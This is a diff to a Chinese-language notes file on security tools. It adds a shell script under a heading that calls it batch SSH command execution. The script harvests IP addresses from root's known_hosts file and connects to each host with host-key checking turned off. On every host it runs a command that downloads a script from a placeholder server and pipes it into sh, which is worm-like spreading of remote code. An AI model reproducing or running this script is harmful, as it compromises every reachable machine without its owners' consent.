@@ -143,8 +143,11 @@ puzlbox [-s Server（默认本地主机）] [-m扫描模式（默认CFLPSX）] [
 ## XSSHunter-Setup安装教程
 `XSSHunter-Setup`安装教程文章
 
-## 
+## ssh批量执行命令
 ```
+#!/bin/sh
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+
 if [ -f /root/.ssh/known_hosts ]; then
   for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "curl -fsSL http://x.x.x.x/z0.txt | sh";done
 fi
